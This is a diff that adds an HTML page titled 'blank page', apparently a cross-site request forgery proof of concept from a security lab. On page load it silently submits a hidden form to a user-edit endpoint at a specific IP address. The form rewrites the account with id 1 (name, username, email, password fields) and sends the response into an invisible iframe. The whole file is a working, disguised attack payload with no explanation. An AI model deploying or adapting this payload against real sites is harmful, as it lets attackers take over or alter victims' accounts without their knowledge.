@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>blank page</title>
+  </head>
+  <body onload="document.edit_user.submit()">
+    <form
+      action="https://35.184.88.145/red/public/staff/users/edit.php?id=1"
+      method="POST"
+      name="edit_user"
+      target="hidden_results"
+    >
+      <input type="hidden" name="first_name" value="Gerry" />
+      <input type="hidden" name="last_name" value="Xu" />
+      <input type="hidden" name="username" value="senpai" />
+      <input type="hidden" name="email" value="senpai@test.com" />
+      <input type="hidden" name="previous_password" value="" />
+      <input type="hidden" name="password" value="" />
+      <input type="hidden" name="confirm_password" value="" />
+      <iframe name="hidden_results" style="display: none;"></iframe>
+    </form>
+  </body>
+</html>
